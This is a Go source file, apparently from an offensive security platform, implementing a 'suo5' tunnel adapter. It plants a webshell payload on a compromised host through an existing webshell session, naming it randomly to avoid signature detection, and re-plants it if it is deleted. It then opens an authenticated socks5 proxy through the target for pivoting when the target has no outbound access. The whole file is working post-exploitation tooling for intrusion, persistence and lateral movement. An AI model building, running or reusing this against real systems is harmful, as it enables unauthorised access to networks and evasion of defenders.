// suo5.go 是「目标无出网」场景的隧道适配器（红日3 复盘最大缺口：出网全 filtered
// 时 chisel 反向隧道无解）。suo5 是 HTTP 隧道：单文件 webshell payload 投到目标
// 可 Web 访问路径，平台侧 suo5 CLI 经【入向】HTTP 与 payload 协商出 socks5——
// 完全不依赖目标出网，只要立足点 webshell 活着、平台能直连目标 Web 口即可。
//
// 与 chisel 适配器共用台账/端口池/巡检/重拉骨架（adapter 字段区分），差异层：
//  1. 无目标侧进程：payload 由目标 Web 容器执行，平台侧只有 suo5 CLI 一个进程
//     （记 ServerPID,procs 台账同一套）;
//  2. socks5 入口必带 --auth 鉴权（CLI 只认命令行，无 env 选项——平台信任域内
//     ps 可见，入口绑 127.0.0.1，取舍注释在此）;
//  3. 重拉即重投：目标 payload 被删后，deploySuo5Into 会重新写入，天然覆盖
//     「payload 被删则重投」。
package tunnel

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	urlpkg "net/url"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/session"
)

// AdapterSuo5 是台账 adapter 字段的 suo5 取值。
const AdapterSuo5 = "suo5"

// suo5UpWait 是等 suo5 CLI 完成握手并起 socks 监听的上限
// （实测本机回环握手 3s+协商+自测连接约 10s，真实目标留足余量）。
const suo5UpWait = 30 * time.Second

// Suo5PlanOpts 是 suo5 计划生成输入。端口分配与绑定检查由调用方注入，
// 保持组装逻辑纯函数可测。
type Suo5PlanOpts struct {
	TaskID       int64
	ViaSessionID int64
	ShellURL     string // 立足点 webshell URL(payload 写同目录、URL 换文件名）
	SessionKind  string // sess.Kind()(http_php/http_phpcmd/http_jsp/http_aspx/http_*enc)
	VerifyAddr   string // 决定性验证目标（webshell host:port，宿主自身必可达）
	PortMin      int
	PortMax      int
	UsedPorts    map[int]bool
	CanListen    func(port int) bool
	DataDir      string // 平台侧隧道工作目录（日志）
}

// Suo5PayloadFile 按会话类型选 payload 文件名：jsp→suo5.jsp,php（含 phpcmd
// 命令马、phpenc 加密马——加密马是传输层加密，目标仍跑明文 PHP)→suo5.php,
// aspx→suo5.aspx。纯函数。
func Suo5PayloadFile(kind string) (string, error) {
	s := strings.ToLower(strings.TrimSpace(kind))
	s = strings.TrimPrefix(s, "http_")
	s = strings.TrimSuffix(s, "enc")
	s = strings.TrimSuffix(s, "cmd")
	switch s {
	case "php":
		return "suo5.php", nil
	case "jsp":
		return "suo5.jsp", nil
	case "aspx":
		return "suo5.aspx", nil
	}
	return "", fmt.Errorf("会话类型 %q 无对应 suo5 payload（支持 php/jsp/aspx)", kind)
}

// Suo5PayloadURL 由 webshell URL 换文件名得 payload URL（同目录）。查询串清掉
// （马 URL 可能带参数，换文件后无意义）。纯函数。
func Suo5PayloadURL(shellURL, name string) (string, error) {
	u, err := urlpkg.Parse(shellURL)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return "", fmt.Errorf("非法 webshell URL %q", shellURL)
	}
	dir := path.Dir(u.Path)
	if dir == "." || dir == "" {
		dir = "/"
	}
	u.Path = path.Join(dir, name)
	u.RawQuery = ""
	u.Fragment = ""
	return u.String(), nil
}

// Suo5Args 组装 suo5 CLI 参数（v2.2.0:-t 目标 URL,-l socks 监听，--auth 必启用）。
// --auth 只认命令行（无 env 选项）；平台信任域 ps 可见，入口绑 127.0.0.1，可接受。纯函数。
func Suo5Args(payloadURL string, port int, user, pass string) []string {
	return []string{
		"-t", payloadURL,
		"-l", "127.0.0.1:" + strconv.Itoa(port),
		"--auth", user + ":" + pass,
	}
}

// joinRemotePath 按目标侧目录形态拼路径（aspx 马在 Windows，分隔符 \)。纯函数。
func joinRemotePath(dir, name string) string {
	dir = strings.TrimRight(dir, "/\\")
	if strings.Contains(dir, "\\") {
		return dir + `\` + name
	}
	return dir + "/" + name
}

// parsePwd 从 pwd 回显取目标侧工作目录（首行非空），并拒绝要内联进 sh 的危险
// 字符（引号/反引号/$/分号）。纯函数。
func parsePwd(out string) (string, error) {
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if strings.ContainsAny(line, "'\"`$;") {
			return "", fmt.Errorf("目标侧工作目录含危险字符，拒绝内联： %q", line)
		}
		if !strings.HasPrefix(line, "/") && !strings.Contains(line, `:\`) {
			return "", fmt.Errorf("目标侧工作目录形态无法识别： %q", line)
		}
		return line, nil
	}
	return "", fmt.Errorf("pwd 回显为空（通道异常？)")
}

// remoteRemoveCmd 生成目标侧 payload 删除命令（aspx 在 Windows 用 del)。纯函数。
func remoteRemoveCmd(payloadFile, payloadPath string) string {
	if strings.HasSuffix(payloadFile, ".aspx") {
		return fmt.Sprintf(`del /f "%s"`, payloadPath)
	}
	return fmt.Sprintf("rm -f '%s'", payloadPath)
}

// PlanSuo5 生成 suo5 计划：kind 恒为 socks，平台回环 ListenPort=SocksPort 是
// socks5 入口（带 auth)。无目标侧进程、无 stage 投递、无 callback——PlatformAddr 留空。
func PlanSuo5(o *Suo5PlanOpts) (*Plan, error) {
	if o.ShellURL == "" {
		return nil, fmt.Errorf("shell_url 必填（suo5 payload 要写到 webshell 同目录）")
	}
	file, err := Suo5PayloadFile(o.SessionKind)
	if err != nil {
		return nil, err
	}
	tag, err := randTag()
	if err != nil {
		return nil, err
	}
	user, pass, err := newAuth()
	if err != nil {
		return nil, err
	}
	name := tag + filepath.Ext(file) // 随机 8 位 hex 文件名，不落特征前缀
	payloadURL, err := Suo5PayloadURL(o.ShellURL, name)
	if err != nil {
		return nil, err
	}
	port, err := AllocatePort(o.PortMin, o.PortMax, o.UsedPorts, o.CanListen)
	if err != nil {
		return nil, err
	}
	if o.UsedPorts == nil {
		o.UsedPorts = map[int]bool{}
	}
	o.UsedPorts[port] = true
	p := &Plan{
		Kind:         KindSocks,
		Adapter:      AdapterSuo5,
		TaskID:       o.TaskID,
		ViaSessionID: o.ViaSessionID,
		ListenHost:   "127.0.0.1", // suo5 入口只绑回环
		ListenPort:   port,
		SocksPort:    port,
		AuthUser:     user,
		AuthPass:     pass,
		ServerLog:    o.DataDir + "/suo5-" + tag + ".log",
		VerifyAddr:   o.VerifyAddr,
		PayloadFile:  file,
		PayloadName:  name,
		PayloadURL:   payloadURL,
	}
	p.ServerArgs = Suo5Args(payloadURL, port, user, pass)
	return p, nil
}

// deploySuo5 是 suo5 适配器的部署入口（Deploy 按 adapter 分流到这里）:建台账行 →
// 投 payload → 探 URL → 起 CLI → 决定性验证 → 标 alive；任一失败逐层回滚（含删行）。
func (m *Manager) deploySuo5(ctx context.Context, p *Plan) (*db.TunnelRecord, error) {
	if m.suo5Path == "" {
		return nil, fmt.Errorf("suo5 二进制缺失：把 suo5 放到 data/tools/suo5 或设 ARTEX_SUO5_PATH 后重试")
	}
	if m.suo5PayloadsDir == "" {
		return nil, fmt.Errorf("suo5 payloads 目录缺失：放到 data/tools/suo5-payloads 或设 ARTEX_SUO5_PAYLOADS_DIR 后重试")
	}
	if p.SocksPort <= 0 {
		return nil, fmt.Errorf("计划缺 socks 入口端口（socks_port)")
	}
	sess, ok := m.sessions.Get(p.ViaSessionID)
	if !ok {
		return nil, fmt.Errorf("会话 %d 不在注册表，无法部署", p.ViaSessionID)
	}
	rec := &db.TunnelRecord{
		TaskID: p.TaskID, Kind: p.Kind, Adapter: p.Adapter,
		ListenHost: p.ListenHost, ListenPort: p.ListenPort,
		ViaSessionID: p.ViaSessionID, State: db.TunnelDeploying,
	}
	raw, _ := json.Marshal(p)
	rec.DeployParams = raw
	id, err := m.store.Create(ctx, rec)
	if err != nil {
		return nil, fmt.Errorf("台账落库失败： %w", err)
	}
	if err := m.deploySuo5Into(ctx, id, sess, p); err != nil {
		m.rollbackSuo5(ctx, id, sess, p)
		return nil, err
	}
	if err := m.store.UpdateState(ctx, id, db.TunnelAlive, ""); err != nil {
		log.Printf("[tunnel] 状态回写失败（id=%d): %v", id, err)
	}
	m.notifyState(p.TaskID)
	rec, _ = m.store.Get(ctx, id)
	return rec, nil
}

// deploySuo5Into 按层推进，每层成功即落台账（供断链重拉）。
func (m *Manager) deploySuo5Into(ctx context.Context, id int64, sess session.Session, p *Plan) error {
	// 层 1：目标侧定位 webshell 所在目录（会话 cwd 即马的目录）并以随机名写入
	// payload(session.WriteFile 内部二进制安全分块）。
	data, err := os.ReadFile(filepath.Join(m.suo5PayloadsDir, p.PayloadFile))
	if err != nil {
		return fmt.Errorf("层 payload_write: 读本地 payload 失败： %w", err)
	}
	stdout, _, err := sess.Exec(ctx, "pwd", probeTimeout)
	if err != nil {
		return fmt.Errorf("层 payload_write: 目标侧定位目录失败： %w", err)
	}
	dir, err := parsePwd(stdout)
	if err != nil {
		return fmt.Errorf("层 payload_write: %w", err)
	}
	p.PayloadPath = joinRemotePath(dir, p.PayloadName)
	if err := sess.WriteFile(ctx, p.PayloadPath, data); err != nil {
		return fmt.Errorf("层 payload_write: 会话写入 %s 失败： %w", p.PayloadPath, err)
	}
	m.saveParams(ctx, id, p)

	// 层 2：平台 HTTP 直连探测 payload URL（可达且非 404;GET 不带隧道参数时
	// payload 可能回错误页，只要不是 404 就证明文件在 Web 根下生效）。
	if err := probePayloadURL(ctx, p.PayloadURL); err != nil {
		return fmt.Errorf("层 payload_url: %w", err)
	}

	// 层 3：平台侧起 suo5 CLI(--auth 必启用，口令随 deploy_params 持久化）。
	logFile, err := os.OpenFile(p.ServerLog, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		return fmt.Errorf("层 cli_process: 日志打开失败： %w", err)
	}
	cmd := exec.Command(m.suo5Path, p.ServerArgs...)
	cmd.Stdout, cmd.Stderr = logFile, logFile
	if err := cmd.Start(); err != nil {
		_ = logFile.Close()
		return fmt.Errorf("层 cli_process: 启动失败： %w", err)
	}
	p.ServerPID = cmd.Process.Pid
	m.procs[id] = cmd
	m.saveParams(ctx, id, p)
	if m.OnListenStart != nil {
		m.OnListenStart(p.ListenPort)
	}
	go func() { _ = cmd.Wait(); _ = logFile.Close() }()

	// 等 CLI 完成与 payload 的握手并起 socks 监听（suo5 起手先测连，失败会秒退）。
	entry := m.entryAddr(p)
	deadline := time.Now().Add(suo5UpWait)
	up := false
	for time.Now().Before(deadline) {
		if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
			return fmt.Errorf("层 cli_process: suo5 秒退（握手失败？日志 %s)", p.ServerLog)
		}
		conn, err := net.DialTimeout("tcp", entry, dialProbeEvery)
		if err == nil {
			_ = conn.Close()
			up = true
			break
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(dialProbeEvery):
		}
	}
	if !up {
		return fmt.Errorf("层 cli_process: %v 内 socks 入口 %s 未起（日志 %s)", suo5UpWait, entry, p.ServerLog)
	}

	// 层 4：决定性验证——经 socks（带 auth)CONNECT webshell 宿主自身（必可达），
	// 成功才证明「payload 生效 + 隧道双向承载」。入口起 ≠ 隧道通。
	if p.VerifyAddr == "" {
		return fmt.Errorf("层 verify: 缺 verify_addr(webshell host:port)，无法做决定性验证")
	}
	if err := socks5DialAuth(entry, p.VerifyAddr, p.AuthUser, p.AuthPass, verifyTimeout); err != nil {
		return fmt.Errorf("层 verify: 经 socks CONNECT %s 失败： %w", p.VerifyAddr, err)
	}
	return nil
}

// rollbackSuo5 部署失败逐层回滚：杀 CLI（释放端口台账钩子）→ 删目标 payload →
// 删台账行。best-effort，每层失败只记日志继续收。
func (m *Manager) rollbackSuo5(ctx context.Context, id int64, sess session.Session, p *Plan) {
	log.Printf("[tunnel] suo5 部署失败逐层回滚（id=%d)", id)
	m.killServer(id, p)
	m.removePayload(ctx, sess, p)
	if err := m.store.Delete(ctx, id); err != nil {
		log.Printf("[tunnel] 台账行删除失败（id=%d): %v", id, err)
	}
}

// removePayload 经会话删目标侧 payload(best-effort)。
func (m *Manager) removePayload(ctx context.Context, sess session.Session, p *Plan) {
	if p.PayloadPath == "" {
		return
	}
	if _, _, err := sess.Exec(ctx, remoteRemoveCmd(p.PayloadFile, p.PayloadPath), probeTimeout); err != nil {
		log.Printf("[tunnel] 删除目标 payload %s 失败： %v", p.PayloadPath, err)
	}
}

// directHTTP 是平台直连 HTTP 客户端（不经环境代理——目标是内网直连地址）。
var directHTTP = &http.Client{
	Timeout:   10 * time.Second,
	Transport: &http.Transport{Proxy: nil},
}

// probePayloadURL 平台直连 GET payload URL：可达且非 404 即过。
func probePayloadURL(ctx context.Context, rawURL string) error {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return fmt.Errorf("payload URL 非法： %w", err)
	}
	resp, err := directHTTP.Do(req)
	if err != nil {
		return fmt.Errorf("payload URL %s 不可达（平台到目标 Web 口不通？): %w", rawURL, err)
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
	if resp.StatusCode == http.StatusNotFound {
		return fmt.Errorf("payload URL %s 返回 404（写入目录与 URL 不同根？)", rawURL)
	}
	return nil
}
